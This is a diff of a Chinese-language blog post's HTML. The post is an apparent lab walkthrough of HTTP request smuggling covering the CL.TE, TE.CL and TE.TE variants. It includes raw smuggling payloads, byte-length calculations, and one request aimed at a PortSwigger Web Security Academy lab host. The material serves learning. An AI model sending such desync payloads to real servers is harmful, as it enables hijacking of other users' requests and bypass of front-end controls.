@@ -18,12 +18,12 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 <script data-ad-client="ca-pub-1515253208026743" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
 
-    <meta name="description" content="什麼是 HTTP Request Smuggling ? 今日常見的網頁應用程式往往會有多一層 server 的存在 請求 --&gt; front-end server --&gt; back-end server front-end server 接收到請求的時候，會轉發到 back-end server 去處理 &lt;!-- more --&gt; http request smuglli">
+    <meta name="description" content="什麼是 HTTP Request Smuggling ?今日常見的網頁應用程式往往會有多一層 server 的存在請求 –&gt; front-end server –&gt; back-end serverfront-end server 接收到請求的時候，會轉發到 back-end server 去處理">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTTP Request Smuggling (HTTP 請求走私)">
 <meta property="og:url" content="https://yu-jack.github.io/2019/09/30/http-smuggling/index.html">
 <meta property="og:site_name" content="技術雜記 Technology Notes">
-<meta property="og:description" content="什麼是 HTTP Request Smuggling ? 今日常見的網頁應用程式往往會有多一層 server 的存在 請求 --&gt; front-end server --&gt; back-end server front-end server 接收到請求的時候，會轉發到 back-end server 去處理 &lt;!-- more --&gt; http request smuglli">
+<meta property="og:description" content="什麼是 HTTP Request Smuggling ?今日常見的網頁應用程式往往會有多一層 server 的存在請求 –&gt; front-end server –&gt; back-end serverfront-end server 接收到請求的時候，會轉發到 back-end server 去處理">
 <meta property="og:locale" content="zh_TW">
 <meta property="og:image" content="https://yu-jack.github.io/images/og_image.png">
 <meta property="article:published_time" content="2019-09-30T07:44:52.000Z">
@@ -167,154 +167,63 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         </h1>
         
             <div class="content">
-                <h1><span id="什麼是-http-request-smuggling">什麼是 HTTP Request Smuggling ?</span></h1>
-<p>今日常見的網頁應用程式往往會有多一層 server 的存在<br>
-請求 --&gt; front-end server --&gt; back-end server<br>
-front-end server 接收到請求的時候，會轉發到 back-end server 去處理</p>
-<p>&lt;!-- more --&gt;</p>
-<p>http request smuglling 的漏洞就是出現在『轉發』到 back-end server 這裏<br>
-有時候為了效能關係，front-end server 到 back-end server 這一段<br>
-會把所有請求塞在同一段 TCP Connection 裡面 (重複利用 TCP Connection)，如下圖<br>
-<img src="/images/http-request-smuggling/image-01.png" alt></p>
-<p>當所有請求集中在一起轉發到 back-end server 時<br>
-如果在這之中有不合法的請求的話，會出現什麼樣的狀況呢？<br>
-此不合法的請求會被當成『下一個』請求被 back-end server 處理<br>
-這就是 HTTP Request Smuggling 攻擊
-<img src="/images/http-request-smuggling/image-02.png" alt></p>
-<h1><span id="http-request-smuggling-原理">HTTP Request Smuggling 原理</span></h1>
-<p>主要是透過 <code>Content-Length</code> 以及 <code>Transfer-Encoding</code> 此兩個標頭<br>
-可以去構造出此攻擊，這邊複習一下這兩個標頭的意義</p>
-<h2><span id="content-length">Content-Length</span></h2>
-<p><code>Content-Length</code> 指的就是用 POST Method 時帶入的 data 的長度<br>
-以此範例來說，總共為 11 bytes，那 <code>Content-Length</code> 就是 11<br>
-(此長度不含 \r\n\r\n，詳細 HTTP 組成可參考此 <a href="https://notfalse.net/39/http-message-format%5D">HTTP/1.1 — 訊息格式 Message Format)</a></p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure></p>
-<h2><span id="transfer-encoding">Transfer-Encoding</span></h2>
-<p><code>Transfer-Encoding</code> 是為了解決上一個標頭 <code>Content-Length</code> 的問題<br>
-而出現的另一個計算 message body 的方式<br>
-詳細可以參考 <a href="https://imququ.com/post/transfer-encoding-header-in-http.html">HTTP 协议中的 Transfer-Encoding</a></p>
-<p>這邊總共分為三個主體
-1. 內容長度 (16 進位)
+                <h1><span id="什麼是-http-request-smuggling">什麼是 HTTP Request Smuggling ?</span></h1><p>今日常見的網頁應用程式往往會有多一層 server 的存在<br>請求 –&gt; front-end server –&gt; back-end server<br>front-end server 接收到請求的時候，會轉發到 back-end server 去處理  </p>
+<a id="more"></a>
+<p>http request smuglling 的漏洞就是出現在『轉發』到 back-end server 這裏<br>有時候為了效能關係，front-end server 到 back-end server 這一段<br>會把所有請求塞在同一段 TCP Connection 裡面 (重複利用 TCP Connection)，如下圖<br><img src="/images/http-request-smuggling/image-01.png" alt></p>
+<p>當所有請求集中在一起轉發到 back-end server 時<br>如果在這之中有不合法的請求的話，會出現什麼樣的狀況呢？<br>此不合法的請求會被當成『下一個』請求被 back-end server 處理<br>這就是 HTTP Request Smuggling 攻擊<br><img src="/images/http-request-smuggling/image-02.png" alt></p>
+<h1><span id="http-request-smuggling-原理">HTTP Request Smuggling 原理</span></h1><p>主要是透過 <code>Content-Length</code> 以及 <code>Transfer-Encoding</code> 此兩個標頭<br>可以去構造出此攻擊，這邊複習一下這兩個標頭的意義  </p>
+<h2><span id="content-length">Content-Length</span></h2><p><code>Content-Length</code> 指的就是用 POST Method 時帶入的 data 的長度<br>以此範例來說，總共為 11 bytes，那 <code>Content-Length</code> 就是 11<br>(此長度不含 \r\n\r\n，詳細 HTTP 組成可參考此 <a href="https://notfalse.net/39/http-message-format]">HTTP/1.1 — 訊息格式 Message Format)</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure>
+<h2><span id="transfer-encoding">Transfer-Encoding</span></h2><p><code>Transfer-Encoding</code> 是為了解決上一個標頭 <code>Content-Length</code> 的問題<br>而出現的另一個計算 message body 的方式<br>詳細可以參考 <a href="https://imququ.com/post/transfer-encoding-header-in-http.html">HTTP 协议中的 Transfer-Encoding</a>  </p>
+<p>這邊總共分為三個主體</p>
+<pre><code>1. 內容長度 (16 進位)
 2. 主要內容
-3. 結束</p>
-<p>以下面的例子來說
-1. 內容長度為: b
+3. 結束
+</code></pre><p>以下面的例子來說</p>
+<pre><code>1. 內容長度為: b
 2. 內容為: q=smuggling
-3. 結束: 0</p>
-<blockquote>
-<p>第二點的內容是不包含 \r\n 的<br>
-除非請求本身不是 POST，需要直接結束的話<br>
-則需要把 \r\n 帶進去，且要計算長度</p>
+3. 結束: 0
+</code></pre><blockquote>
+<p>第二點的內容是不包含 \r\n 的<br>除非請求本身不是 POST，需要直接結束的話<br>則需要把 \r\n 帶進去，且要計算長度  </p>
 </blockquote>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q&#x3D;smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p>
-<p>而 HTTP 為了預防此兩個標頭同時使用<br>
-所以當這兩個標頭同時出現的時候，會忽略 <code>Content-Length</code> 這個標頭<br>
-再加上 front-end 和 back-end server 處理此兩個標頭的方式可能不一樣</p>
-<p>代表說當以下情況出現時
-front-end 支援 <code>Content-Length</code> 但不支援 <code>Transfer-Encoding</code><br>
-back-end  支援 <code>Content-Length</code> 支援 <code>Transfer-Encoding</code><br>
-如果我同時送了兩個標頭過去的話，front-end 就只會處理 <code>Content-Length</code> 格式的內容<br>
-而 back-end 就只會處理 <code>Transfer-Encoding</code> 格式的內容<br>
-造成不一致的現象，這造成 HTTP Request Smuggling 漏洞的問題原因之一</p>
-<p>反過來說
-front-end 支援 <code>Content-Length</code> 支援 <code>Transfer-Encoding</code><br>
-back-end  支援 <code>Content-Length</code> 但不支援 <code>Transfer-Encoding</code><br>
-也會造成不一致的現象，也是問題原因之一</p>
-<p>上面兩個例子各代表為 CL.TE vulnerabilities 以及 TE.CL vulnerabilities<br>
-CL = Content-Length<br>
-TE = Transfer-Encoding<br>
-順序代表了 front-end.back-end，簡單來說就是看誰支援什麼</p>
-<h1><span id="構造-http-request-smuggling">構造 HTTP Request Smuggling</span></h1>
-<h2><span id="clte">CL.TE</span></h2>
-<p>基本請求的概念如下<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure></p>
-<p>因為前端支援 CL，所以就先用 CL 把要偷渡的請求先放在最下面<br>
-並且用一個 0 放在前面代表著 TE 的結束符號<br>
-當請求到 back-end 的時候<br>
-POST 到 0 那一段就會是一個 reuqest<br>
-SMUGGLED 那一段就會是下一個 request</p>
-<p>這邊根據參考資料的網站去做一下實驗<br>
-因為題目說要構造出 GPOST 到 back-end 處理</p>
-<p>先試著對 front-end server 做 GPOST 得到此回應<br>
-<img src="/images/http-request-smuggling/image-03.png" alt></p>
-<p>接下來就是要把 GPOST 偷渡在 request 裡面送到 back-end<br>
-Payload 為下:<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>記得要有 \r\n 插在中間才代表 request 的結束<br>
-不然會出現 timeout 或是 invalid request 的問題<br>
-而在最後面的 GPOST 需要兩個 \r\n<br>
-這樣的 <code>Content-Length</code> 計算是需要包含 \r\n<br>
-\r 一個 byte
-\n 一個 byte</p>
-<p>所以從 0 開始那一段<br>
-0\r\n -&gt; 3 bytes<br>
-\r\n -&gt; 2 byte<br>
-GPOST /test HTTP/1.1\r\n -&gt; 22 bytes<br>
-\r\n -&gt; 2 bytes<br>
-總計為 29 bytes</p>
-<p>第一次送 request 會得到正常的請求
-<img src="/images/http-request-smuggling/image-04.png" alt></p>
-<p>第二次送，因為前一次 request 走私了一個 request<br>
-所以 response 會回應到此次 request 上<br>
-就得到 Unreconize GPOST Method 了<br>
-<img src="/images/http-request-smuggling/image-05.png" alt></p>
-<h2><span id="tecl">TE.CL</span></h2>
-<p>基本請求的概念如下<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>因為前端支援 TE，所以就先用 TE 把要偷渡的請求先放在最中間<br>
-再微調 CL 的長度，讓 back-end 只處理到 TE 的第一個主體，
-這邊要注意是 CL 的設置，長度要設置到 TE 的第一個主體結尾 (包含 \r\n)<br>
-以上面的例子來說，CL 長度要填到 8\r\n 為止 (3 bytes)<br>
-後面就放要走私的請求即可</p>
-<p>這邊根據參考資料的網站去做一下實驗<br>
-第一個要注意的點是要偷渡的 request 長度<br>
-GPOST /test HTTP/1.1\r\n -&gt; 22 bytes<br>
-\r\n -&gt; 2 bytes<br>
-24 bytes 轉成 16 進位變成 16</p>
-<p>第二個要注意的點是 CL 長度為 4<br>
-16\r\n -&gt; 4 bytes</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>第一次送 request 會得到正常的請求<br>
-<img src="/images/http-request-smuggling/image-06.png" alt></p>
-<p>第二次送，因為前一次 request 走私了一個 request<br>
-所以 response 會回應到此次 request 上<br>
-就得到 Unreconize GPOST Method 了<br>
-<img src="/images/http-request-smuggling/image-07.png" alt></p>
-<h2><span id="tete">TE.TE</span></h2>
-<p>還有一種是利用 front-end 和 back-end 對 TE 不同的解析方式去攻擊<br>
-透過帶入讓 server 混淆的 TE，可以藉此讓 server 不去解析 TE<br>
-而改去解析 CL</p>
-<p>舉例來說帶入 <code>Transfer-Encoding: cow</code><br>
-front-end server 如果把它判別成錯誤的標題，此時會轉去判斷 CL<br>
-這樣攻擊就是 CL.TE 攻擊了</p>
-<p>反過來是 back-end server 解析錯誤，改轉去判斷 CL 的話<br>
-那就是 TE.CL 攻擊了</p>
-<p>根據網站去做攻擊實驗<br>
-此實驗是 TE.CL 攻擊，代表 back-end server 針對 TE 解析有誤</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac1b1fd31f891d6c80bb2c930035000c.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow</span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">--- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>byte 算法跟前面的 TE.CL 一樣</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q&#x3D;smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p>而 HTTP 為了預防此兩個標頭同時使用<br>所以當這兩個標頭同時出現的時候，會忽略 <code>Content-Length</code> 這個標頭<br>再加上 front-end 和 back-end server 處理此兩個標頭的方式可能不一樣  </p>
+<p>代表說當以下情況出現時<br>front-end 支援 <code>Content-Length</code> 但不支援 <code>Transfer-Encoding</code><br>back-end  支援 <code>Content-Length</code> 支援 <code>Transfer-Encoding</code><br>如果我同時送了兩個標頭過去的話，front-end 就只會處理 <code>Content-Length</code> 格式的內容<br>而 back-end 就只會處理 <code>Transfer-Encoding</code> 格式的內容<br>造成不一致的現象，這造成 HTTP Request Smuggling 漏洞的問題原因之一</p>
+<p>反過來說<br>front-end 支援 <code>Content-Length</code> 支援 <code>Transfer-Encoding</code><br>back-end  支援 <code>Content-Length</code> 但不支援 <code>Transfer-Encoding</code><br>也會造成不一致的現象，也是問題原因之一  </p>
+<p>上面兩個例子各代表為 CL.TE vulnerabilities 以及 TE.CL vulnerabilities<br>CL = Content-Length<br>TE = Transfer-Encoding<br>順序代表了 front-end.back-end，簡單來說就是看誰支援什麼  </p>
+<h1><span id="構造-http-request-smuggling">構造 HTTP Request Smuggling</span></h1><h2><span id="clte">CL.TE</span></h2><p>基本請求的概念如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure></p>
+<p>因為前端支援 CL，所以就先用 CL 把要偷渡的請求先放在最下面<br>並且用一個 0 放在前面代表著 TE 的結束符號<br>當請求到 back-end 的時候<br>POST 到 0 那一段就會是一個 reuqest<br>SMUGGLED 那一段就會是下一個 request  </p>
+<p>這邊根據參考資料的網站去做一下實驗<br>因為題目說要構造出 GPOST 到 back-end 處理  </p>
+<p>先試著對 front-end server 做 GPOST 得到此回應<br><img src="/images/http-request-smuggling/image-03.png" alt></p>
+<p>接下來就是要把 GPOST 偷渡在 request 裡面送到 back-end<br>Payload 為下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
+<p>記得要有 \r\n 插在中間才代表 request 的結束<br>不然會出現 timeout 或是 invalid request 的問題<br>而在最後面的 GPOST 需要兩個 \r\n<br>這樣的 <code>Content-Length</code> 計算是需要包含 \r\n<br>\r 一個 byte<br>\n 一個 byte</p>
+<p>所以從 0 開始那一段<br>0\r\n -&gt; 3 bytes<br>\r\n -&gt; 2 byte<br>GPOST /test HTTP/1.1\r\n -&gt; 22 bytes<br>\r\n -&gt; 2 bytes<br>總計為 29 bytes  </p>
+<p>第一次送 request 會得到正常的請求<br><img src="/images/http-request-smuggling/image-04.png" alt></p>
+<p>第二次送，因為前一次 request 走私了一個 request<br>所以 response 會回應到此次 request 上<br>就得到 Unreconize GPOST Method 了<br><img src="/images/http-request-smuggling/image-05.png" alt></p>
+<h2><span id="tecl">TE.CL</span></h2><p>基本請求的概念如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
+<p>因為前端支援 TE，所以就先用 TE 把要偷渡的請求先放在最中間<br>再微調 CL 的長度，讓 back-end 只處理到 TE 的第一個主體，<br>這邊要注意是 CL 的設置，長度要設置到 TE 的第一個主體結尾 (包含 \r\n)<br>以上面的例子來說，CL 長度要填到 8\r\n 為止 (3 bytes)<br>後面就放要走私的請求即可</p>
+<p>這邊根據參考資料的網站去做一下實驗<br>第一個要注意的點是要偷渡的 request 長度<br>GPOST /test HTTP/1.1\r\n -&gt; 22 bytes<br>\r\n -&gt; 2 bytes<br>24 bytes 轉成 16 進位變成 16  </p>
+<p>第二個要注意的點是 CL 長度為 4<br>16\r\n -&gt; 4 bytes  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure>
+<p>第一次送 request 會得到正常的請求<br><img src="/images/http-request-smuggling/image-06.png" alt>  </p>
+<p>第二次送，因為前一次 request 走私了一個 request<br>所以 response 會回應到此次 request 上<br>就得到 Unreconize GPOST Method 了<br><img src="/images/http-request-smuggling/image-07.png" alt>  </p>
+<h2><span id="tete">TE.TE</span></h2><p>還有一種是利用 front-end 和 back-end 對 TE 不同的解析方式去攻擊<br>透過帶入讓 server 混淆的 TE，可以藉此讓 server 不去解析 TE<br>而改去解析 CL  </p>
+<p>舉例來說帶入 <code>Transfer-Encoding: cow</code><br>front-end server 如果把它判別成錯誤的標題，此時會轉去判斷 CL<br>這樣攻擊就是 CL.TE 攻擊了  </p>
+<p>反過來是 back-end server 解析錯誤，改轉去判斷 CL 的話<br>那就是 TE.CL 攻擊了  </p>
+<p>根據網站去做攻擊實驗<br>此實驗是 TE.CL 攻擊，代表 back-end server 針對 TE 解析有誤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac1b1fd31f891d6c80bb2c930035000c.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow</span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">--- 不包含此行</span><br></pre></td></tr></table></figure>
+<p>byte 算法跟前面的 TE.CL 一樣  </p>
 <blockquote>
-<p>如果此漏洞是 front-end server 針對 TE 有解析問題的話<br>
-Payload 和算法就要改成 CL.TE 的方式了</p>
+<p>如果此漏洞是 front-end server 針對 TE 有解析問題的話<br>Payload 和算法就要改成 CL.TE 的方式了  </p>
 </blockquote>
-<p>第一次送 request 會得到正常的請求<br>
-<img src="/images/http-request-smuggling/image-08.png" alt></p>
-<p>第二次送，因為前一次 request 走私了一個 request<br>
-所以 response 會回應到此次 request 上<br>
-就得到 Unreconize GPOST Method 了<br>
-<img src="/images/http-request-smuggling/image-09.png" alt></p>
-<h1><span id="後記">後記</span></h1>
-<p>上面簡單的根據自己理解的意思<br>
-去說明了一下如何使用 HTTP Request Smuggling 攻擊<br>
-其他更詳細的可以參考下面資料，都有提供 lab 去做攻擊<br>
-而且官方寫的都非常詳細，非常建議去看看和玩玩看 lab</p>
-<h1><span id="參考資料">參考資料</span></h1>
-<ol>
+<p>第一次送 request 會得到正常的請求<br><img src="/images/http-request-smuggling/image-08.png" alt>  </p>
+<p>第二次送，因為前一次 request 走私了一個 request<br>所以 response 會回應到此次 request 上<br>就得到 Unreconize GPOST Method 了<br><img src="/images/http-request-smuggling/image-09.png" alt>  </p>
+<h1><span id="後記">後記</span></h1><p>上面簡單的根據自己理解的意思<br>去說明了一下如何使用 HTTP Request Smuggling 攻擊<br>其他更詳細的可以參考下面資料，都有提供 lab 去做攻擊<br>而且官方寫的都非常詳細，非常建議去看看和玩玩看 lab</p>
+<h1><span id="參考資料">參考資料</span></h1><ol>
 <li><a href="https://portswigger.net/web-security/request-smuggling">What is HTTP request smuggling</a></li>
 <li><a href="https://portswigger.net/web-security/request-smuggling/finding">Finding HTTP Request Smuggling</a></li>
 <li><a href="https://portswigger.net/web-security/request-smuggling/exploiting">Exploiting HTTP Request Smuggling</a></li>
-<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attacks: Request Smuggling Reborn</a>
-此文章是作者如何繞過 PayPal 登入機制所寫的</li>
+<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attacks: Request Smuggling Reborn</a><br> 此文章是作者如何繞過 PayPal 登入機制所寫的</li>
 </ol>
 
             </div>
